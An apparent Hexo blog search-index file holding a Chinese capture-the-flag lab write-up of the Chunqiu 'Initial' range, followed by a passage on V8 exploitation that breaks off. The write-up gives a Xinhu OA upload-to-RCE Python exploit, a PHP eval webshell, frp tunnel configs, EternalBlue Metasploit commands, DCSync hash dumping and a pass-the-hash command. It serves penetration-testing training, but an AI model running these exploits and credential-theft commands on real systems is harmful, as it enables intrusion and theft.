<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>春秋云境Initial详解</title>
      <link href="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/"/>
      <url>/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/1.png" class="" title="我的图图呢">  <h1 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h1><p>一直都知道渗透在网络安全中的重要性，可是一直都没用重视，于是在国赛决赛吃大亏。平时自己也在打打 <code>vulnhub</code>，但打的都是一些十分简单的靶场。国赛决赛结束后我就开始push校队的人去学习渗透，当然我这个新上任的队长肯定要起到带头作用，所以我也开始去练习春秋云境的靶场。很多人认为云境这个靶场比较贵，但是我认为能够用钱买知识是一件很划算的事情，而且春秋云境的靶场质量也比较高（还有国赛渗透也有很多内容来自这里面）<br>这篇文章是关于 <code>Initial</code> 这个靶机的详细讲解，这个是云境中最简单的一题，同时也是我打的第一个关于 <code>windows</code> 渗透的题目，因此学到了很多的东西。</p><h1 id="详细讲解"><a href="#详细讲解" class="headerlink" title="详细讲解"></a>详细讲解</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>题目给出了一个ip地址 <code>39.99.255.153</code>，我们可以使用 <code>nmap</code> 来看看他开启了那些端口，命令为：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 39.99.255.153</span><br></pre></td></tr></table></figure><p>这段命令是以最小速率 <code>10000</code> 对全部端口（1-65535）进行扫描，<code>10000</code> 是权衡的结果，数字过大扫描速度快，但容易遗漏端口，数字过小则扫描时间过长，经验表明 <code>10000</code> 就是扫描的合适速度。<code>-p</code> 是端口参数，<code>-p-</code> 表示对所有端口进行扫描。扫描结果如下：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/2.png" class="" title="我的图图呢">  <p>可以看到开启了 <code>22</code>、<code>80</code> 端口，<code>22</code> 端口是一个 <code>ssh</code> 服务，<code>80</code> 端口是一个 <code>http</code> 服务，接下来我们可以查看这个几个端口开启的服务和操作系统版本，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –sT –sV -O –p22,80 39.99.255.153</span><br></pre></td></tr></table></figure><p>其中 <code>-sT</code> 表示进行 <code>TCP</code> 扫描（三次握手），<code>-p</code> 表示待扫描的端口（后跟待扫描的端口 <code>22</code>、<code>80</code>），<code>-sV</code> 表示探测开放服务的版本，<code>-O</code> 表示探测操作系统版本，扫描结果如下：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/3.png" class="" title="我的图图呢">  <p>可以看到这个ip是一台 <code>ubuntu linux</code> 服务器，好像也没有什么有用的信息，想到还有一个非常好用的扫描工具 <code>fscan</code>，工具的下载地址为：<br><a href="https://github.com/shadow1ng/fscan">shadow1ng&#x2F;fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。 (github.com)</a><br>这个工具有linux和windows版本，其具体用法可以看官方的文档，这里只用于进行简单的端口扫描，输入：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\fscan <span class="literal">-h</span> <span class="number">39.99</span>.<span class="number">255.153</span></span><br></pre></td></tr></table></figure><p>结果如下：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/4.png" class="" title="我的图图呢">  <p>可以看到 <code>web server</code> 的版本是 <code>ThinkPHP 5.0.23</code>，而且存在漏洞！！！<br>当然也可以使用<code>nmap</code>命令来进行漏洞扫描，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -script=vuln -p22,80 39.99.255.153</span><br></pre></td></tr></table></figure><p>这里使用 <code>ThinkphpGUI</code> 这个开源工具来进行扫一下，工具链接为：<br><a href="https://github.com/Lotus6/ThinkphpGUI">Lotus6&#x2F;ThinkphpGUI: Thinkphp(GUI)漏洞利用工具，支持各版本TP漏洞检测，命令执行，getshell。 (github.com)</a><br>输入 <code>url</code> 和选择版本后点击检测和 <code>GetShell</code> 即可，结果如下：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/5.png" class="" title="我的图图呢">  <p>可以到网页存在一个后门，还有一个漏洞利用的 <code>poc</code>，我们利用他给的 <code>poc</code> 来写入 <code>shell.php</code> 后门</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/6.png" class="" title="我的图图呢">  <p>好像也没有什么回显，于是我们直接使用蚁剑来连他自带的后门：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/7.png" class="" title="我的图图呢">  <img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/8.png" class="" title="我的图图呢">  <p>成功连接，而且我们能看见当前目录下有一个 <code>shell.php</code> 文件</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/9.png" class="" title="我的图图呢">  <p>点开可以发现其就是我们利用 <code>poc</code> 上传的后门，不过问题不大，能进来就行，接下来就是需要提取，我们先看一下自己是什么权限：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/10.png" class="" title="我的图图呢">  <p>可以看见是 <code>www-data</code> 权限，可是输入 <code>sudo -l</code> 时回显</p><blockquote><p>(root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;mysql</p></blockquote><p>这说明我们可以通过通过 <code>sudo</code> 高权限运行 <code>mysql</code>，进而能够执行 <code>root</code>权 限才能执行的命令，可以参考下面这篇文章，里面也有讲很多种提取的方法<br><a href="https://blog.csdn.net/Bossfrank/article/details/132035121">渗透测试：Linux提权精讲（三）之sudo方法第三期_nmap sudo 提权-CSDN博客</a></p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/11.png" class="" title="我的图图呢">  <p>于是我们就能很容易的获取到 <code>flag1</code>，可以发现 <code>flag1</code> 在 <code>/root/flag</code> 目录下</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/12.png" class="" title="我的图图呢">  <h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>接下来就是要考虑内网横向移动，我们的最终目的是获取域控上的 <code>flag</code>，我们先用蚁剑上传 <code>fscan</code>，扫描一下内网中有那些存活机器</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/13.png" class="" title="我的图图呢">  <p>这里要记得给 <code>fscan</code> 执行权限，否则会执行不了<br>通过 <code>ip a</code> 我们可以发现网段为 <code>172.22.1.0/24</code></p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/14.png" class="" title="我的图图呢">  <p>扫描的结果会自动存在当前目录的 <code>result.txt</code> 文件上</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/15.png" class="" title="我的图图呢">  <p>于是我们搜集到如下信息：</p><blockquote><p>172.22.1.2:DC域控<br>172.22.1.21:Windows的机器并且存在MS17-010 漏洞<br>172.22.1.18:信呼OA办公系统</p></blockquote><p>而我们的最终目标即为 <code>DC</code> 域控<br>我们搜先是对 <code>OA</code> 办公系统进行攻击，在这之前我们要先进行内网穿透，其目的是使我们能够在攻击机访问内网的服务，这里我们需要一台 <code>vps</code> 和工具 <code>frp</code>，学过web的师傅都知道 <code>vps</code> 是什么，这里就不做解释，<code>frp</code> 的相关知识也请读者自行学习，这里只做简单的介绍。<code>frp</code>的下载地址为，有linux和windows版本：<br><a href="https://github.com/fatedier/frp">fatedier&#x2F;frp: A fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet. (github.com)</a><br>该工具的目录如下：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/16.png" class="" title="我的图图呢">  <p>其中 <code>frpc</code> 和 <code>frps</code> 是可执行文件，我们需要将 <code>frps</code> 和 <code>frps.ini</code> 上传到我们的 <code>vps</code>，<code>frpc</code><br>和 <code>frpc.ini</code> 上传到我们的靶机<br>下面是我相关文件的配置<br>frpc.ini：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">server_addr = 120.46.199.181 # 我vps的ip地址</span><br><span class="line">server_port = 7000  </span><br><span class="line"></span><br><span class="line">[socks5] </span><br><span class="line">type = tcp   </span><br><span class="line">plugin = socks5  </span><br><span class="line">remote_port = 798</span><br></pre></td></tr></table></figure><p>frps.ini：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><p>这里要确保你的 <code>vps</code> 开启了 <code>7000</code> 和 <code>798</code> 端口<br>然后在靶机执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p>在 <code>vps</code> 执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure><p>最后在攻击机你自己的电脑上（<code>windows</code>，不是 <code>kali</code>，<code>kali</code> 的配置方法在后面有讲）使用 <code>Proxy Servers</code> 配置 <code>socks5</code> 代理即可</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/17.png" class="" title="我的图图呢">  <p>其原理我不懂，学院到现在还没有教计算机网络，加上我一个纯pwn手也没去研究这种东西（其实是我懒），请师傅们轻点骂 :-(<br>最后还要在 <code>Proxy Servers</code> 上配置一下 <code>Proxificantion Rule</code>，吧除了刚配置的那一项以外的全部勾勾去掉，不然还是会访问不了，原理还是不知道🤔<br>配置完后就能直接在浏览器中输入 <code>172.22.1.18</code> 进行访问了，可以看到该系统的版本是 <code>2.2.8</code> （这个是重点，可以通过搜索系统的版本号看看有没有已经给发现的漏洞）</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/18.png" class="" title="我的图图呢">  <p>这里存在一个弱口令，admin&#x2F;admin123。</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/19.png" class="" title="我的图图呢">  <p>登录后就是 <code>web</code> 手的事情了，这个系统存在文件上传漏洞，有直接的 <code>poc</code>，这里我直接参考：<br><a href="https://blog.csdn.net/solitudi/article/details/118675321">[代码审计]信呼协同办公系统2.2存在文件上传配合云处理函数组合拳RCE_信呼协同办公系统弱口令-CSDN博客</a><br>exp.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://url/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;dGVzdA::&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWJjMTIz&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;whoami&#x27;);&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相同目录下还有一个 <code>1.php</code> 文件存的是一句话木马<br>1.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;1&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行后可以看到文件上传的路径：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/20.png" class="" title="我的图图呢">  <p>然后直接蚁剑连接：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/21.png" class="" title="我的图图呢">  <p>连接成功：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/22.png" class="" title="我的图图呢">  <p>可以看到已经拥有了 <code>system</code> 权限，我们直接在 <code>Administrator</code> 用户的目录下找到 <code>flag2</code></p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/23.png" class="" title="我的图图呢">  <h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>接下来我们就对 <code>ip 172.22.1.21</code> 进行渗透，这里需要用到渗透框架 <code>Metasploit Framework</code>，<code>kali</code> 自带这个框架，这里的攻击机我选用 <code>kali</code>（windows也可以安装Metasploit Framework，不过上面我说过也要讲讲如何在kali设置代理）。我们首先要在 <code>kali</code> 中设置 <code>socks5</code> 代理，否则我们无法访问其内网的环境。<br>在 <code>kali</code> 中设置代理比 <code>windows</code> 简单很多，他自带了一个 <code>proxychains4</code> 工具，我们只需要编辑 <code>etc</code> 目录下的 <code>proxychians4.conf</code> 文件：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/24.png" class="" title="我的图图呢">  <p>在最下面的 <code>ProxyList</code> 上加上 <code>socks5 vps ip 端口</code> 即可  </p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/25.png" class="" title="我的图图呢">  <p>然后就能在浏览器中访问靶机内网的 <code>172.22.1.*</code> 那三台机器了<br>在上面用 <code>fscan</code> 的扫描中我们发现该机子存在 <code>MS17-010</code> 漏洞，这个就是大名鼎鼎的永恒之蓝漏洞<br>我们先在 <code>kali</code> 输入 <code>msfconsole</code> 启动 <code>Metasploit Framework</code> （后面简称 <code>msf</code>）</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/26.png" class="" title="我的图图呢">  <p>可以看见界面十分的酷炫，而且每次启动 <code>msf</code> 时这个图片都会不一样<br>输入 <code>search ms17-010</code> 搜索 <code>ms17-010</code> 相关模块，可以看到一共找到了 <code>4</code> 个不同的模块：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/27.png" class="" title="我的图图呢">  <p>这里我们选择使用第一个模块，因为他影响是版本比较多，然后接下来依次输入以下命令来发起永恒之蓝攻击：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue  <span class="comment"># 选择使用的模块</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid  <span class="comment"># 设置payload，可以通过show payloads查看</span></span><br><span class="line"><span class="built_in">set</span> RHOSTS 172.22.1.21  <span class="comment"># 设置靶机的ip</span></span><br><span class="line">exploit  <span class="comment"># 发起攻击</span></span><br></pre></td></tr></table></figure><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/28.png" class="" title="我的图图呢">  <p>运行成功会出现meterpreter&gt;<br>该 <code>Meterpreter</code> 是 <code>metasploit</code> 的一个扩展模块，可以调用 <code>metasploit</code> 的一些功能，对目标系统进行更深入的渗透，入获取屏幕、上传&#x2F;下载文件、创建持久后门等。<br>下面介绍一些该模块常用的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; screenshot <span class="comment"># 捕获屏幕</span></span><br><span class="line">meterpreter &gt; upload hello.txt c:// <span class="comment">#上传文件</span></span><br><span class="line">meterpreter &gt; download d://1.txt <span class="comment"># 下载文件</span></span><br><span class="line">meterpreter &gt; shell <span class="comment"># 获取cmd</span></span><br><span class="line">meterpreter &gt; clearev <span class="comment"># 清除日志</span></span><br></pre></td></tr></table></figure><p>紧接着上图，可以发现我们已经成功的打进该主机，遗憾的是该机子上并没有 <code>flag</code>  ，也就是说我们最后的<code>flag</code> 在 <code>windows DC</code> 域控制器上面<br>接下来是进行 <code>DCSync</code> 攻击，这里简单解释一下：<br>首先，什么是 <code>DCSync</code></p><blockquote><p>在域中，不同的域控之间，默认每隔15min就会进行一次域数据同步。当一个额外的域控想从其他域控同步数据时，额外域控会像其他域控发起请求，请求同步数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用这个原理，通过目录复制服务（Directory Replication Service，DRS）的GetNCChanges接口像域控发起数据同步请求，以获得指定域控上的活动目录数据。目录复制服务也是一种用于在活动目录中复制和管理数据的RPC协议。该协议由两个RPC接口组成。分别是drsuapi和dsaop。<br>DCSync是mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，能够用来导出域内所有用户的hash</p></blockquote><p>也就是说我们可以通过 <code>DCSync</code> 来导出所有用户的 <code>hash</code> 然后进行哈希传递攻击，要想使用 <code>DCSync</code> 必须获得以下任一用户的权限：</p><blockquote><p>Administrators 组内的用户<br>Domain Admins 组内的用户<br>Enterprise Admins 组内的用户域控制器的计算机帐户</p></blockquote><p>现在我们回到一开始 <code>fscan</code> 的扫描结果：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/29.png" class="" title="我的图图呢">  <p>我们可以看到我们用永恒之蓝打下的这台机子是 <code>enterprise</code> 用户，也就是说满足 <code>DCSync</code> 攻击的条件，于是我们在 <code>msf</code> 中依次输入以下命令来获取用户的 <code>hash</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi  <span class="comment"># 调用mimikatz模块</span></span><br><span class="line">kiwi_cmd <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span>  <span class="comment"># 导出域内所有用户的信息(包括哈希值)</span></span><br></pre></td></tr></table></figure><p>结果如下：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/30.png" class="" title="我的图图呢">  <p>这里我们比较关注是 <code>Administrator</code> 用户的 <code>hash</code>，接下来我们使用 <code>crackmapexec</code> 来进行哈希传递攻击，来实现 <code>DC域控</code> 上的任意命令执行，通过以下命令来获取 <code>flag3</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span></span><br></pre></td></tr></table></figure><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/31.png" class="" title="我的图图呢">  <p>最终 <code>flag</code> 为 <code>flag&#123;60b53231-2ce3-4813-87d4-e8f88d0d43d6&#125;</code></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>感觉这种渗透和穿透的web还是有一点区别，从外网打进内网的过程要第一步要做的不是自己去寻找和日漏洞，而是看看系统有没有历史遗留的漏洞以及是否有现成的exp进行攻击。打国决的时候有的队伍拿着现成的exp直接开局2分钟就打进内网了，而我们队伍就和做传统web题目一样一步一步的打，耗费了很多时间才打进去，非常的吃亏。<br>在打这个靶场中花费时间最多的是用 <code>frp</code> 进行内网穿透，主要是我理解能力比较差，网上的文章看的似懂非懂的。期间还请教了unknown师傅和panz0e师傅，然后某人就因为这件事情没完成上班任务😂😂😂😂😂</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/32.png" class="" title="我的图图呢">  <p>虽然靶场比较简单，可是还是花费了我许多的时间，还是Csome师兄说的那句话：“菜就多练”，这一年打算多练练渗透，希望明年国赛不会留下遗憾<br>参考：<br><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">域渗透——DCSync (3gstudent.github.io)</a><br><a href="https://blog.csdn.net/weixin_63576152/article/details/133462469">春秋云境Initial-WP（附带详细代理过程）_lnitial靶机-CSDN博客</a><br><a href="https://blog.csdn.net/ElsonHY/article/details/109939420">MS17-010（Eternal blue永恒之蓝）漏洞利用+修复方法-CSDN博客</a><br><a href="https://bbs.kanxue.com/thread-269208.htm">[原创]MS17-010 “永恒之蓝”漏洞分析与复现-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a><br><a href="https://cloud.tencent.com/developer/article/1861364">内网渗透｜谈谈HASH传递那些世人皆知的事-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>初探v8漏洞利用</title>
      <link href="/2024/05/05/v8start/"/>
      <url>/2024/05/05/v8start/</url>
      
        <content type="html"><![CDATA[<p>一直觉得 <code>v8</code> 漏洞利用是一件非常好玩的事情，所以找时间入门了一下，这篇博客所使用的环境是 <code>*CTF 2019</code> 的 <code>oob</code>，相关附件读者可以自行上网搜索下载。这篇博客主要用于总结本人在入门 <code>v8</code> 漏洞利用时所学到的东西，由于 <code>Qanux</code> 又菜又爱玩，文章不免存在许多的问题，请读者多多包容  </p><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>在开始之前，肯定有很多人想问 v8 是一个什么东西，下面是在知乎中搜到的对于 v8 的描述：  </p><blockquote><p>V8引擎是由C++编写的Google开源高性能JavaScript和WebAssembly引擎，它用于Chrome和Node.js等。<br>V8可以独立运行，也可以嵌入到任何C++应用程序中。<br>V8支持众多操作系统，如Windows、linux、android等，也支持其他硬件架构，如IA32,X64,ARM等，具有很好的可移植和跨平台特性。  </p></blockquote><p>作为 <code>js</code> 引擎，<code>V8</code> 会编译 &#x2F; 执行 <code>JavaScript</code> 代码，管理内存，负责垃圾回收，与宿主语言的交互等。通过暴露宿主对象 (变量，函数等) 到 <code>JavaScript</code>，<code>JavaScript</code> 可以访问宿主环境中的对象，并在脚本中完成对宿主对象的操作。<br>接下来看看 <code>v8</code> 工作原理的简化细分：  </p><img src="/2024/05/05/v8start/1.png" class="" title="我的图图呢">  <p>当 <code>Chrome</code> 或 <code>Node.js</code> 需要执行一段 <code>JavaScript</code> 代码时，它会将源代码传递给 <code>V8</code>。<code>V8</code> 将 <code>JavaScript</code> 源代码送入所谓的解析器 (<code>Parser</code>)，解析器为源代码创建一个抽象语法树 (<code>AST</code>) 表示。<code>AST</code> 随后被传递给新引入的 <code>Ignition</code> 解释器，在那里它被转换成一系列字节码。然后，<code>Ignition</code> 执行这个字节码序列。<br>在执行过程中，<code>Ignition</code> 收集了有关某些操作输入的剖析信息或反馈。其中一些反馈被 <code>Ignition</code> 自身用来加速后续的字节码解释。例如，对于属性访问，如果在所有时间都具有相同的形状 (即你总是为属性a传递一个值，其中 <code>a</code> 是一个字符串)，我们会缓存如何获取 <code>a</code> 值的信息。在后续执行相同的字节码时，我们不需要再次搜索a。这里的底层机制称为内联缓存 (<code>IC</code>)。  </p><p>接下来再聊聊什么是 <code>d8</code>。<code>d8</code> 是一个非常有用的调试工具，你可以把它看成是 <code>debug for V8</code> 的缩写。我们可以使用 <code>d8</code> 来查看 <code>V8</code> 在执行 <code>JavaScript</code> 过程中的各种中间数据，比如作用域、AST、字节码、优化的二进制代码、垃圾回收的状态，还可以使用 <code>d8</code> 提供的私有 <code>API</code> 查看一些内部信息。  </p><h1 id="走进v8"><a href="#走进v8" class="headerlink" title="走进v8"></a>走进v8</h1><p>本来想写写如何配置 <code>v8</code> 环境的，可是网上相关资料太多了，加上笔者比较懒，就没写，等哪天心血来潮再补上吧  </p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>在给 <code>gdb</code> 配置好 <code>v8</code> 的调试文件后，即可利用如下命令来调试我们的 <code>JavaScript</code> 代码：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./d8</span><br><span class="line">r --allow-natives-syntax --shell ./exp.js</span><br></pre></td></tr></table></figure><p>这里解释一下命令里面的几个参数：  </p><ul><li>–allow-natives-syntax：开启原生 <code>API</code> (用的比较多)  </li><li>–shell：运行脚本后切入交互模式</li></ul><p>在调试的过程中我们可以在代码中加入如下代码来进行调试：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%<span class="title class_">DebugPrint</span>(obj);</span><br><span class="line">%<span class="title 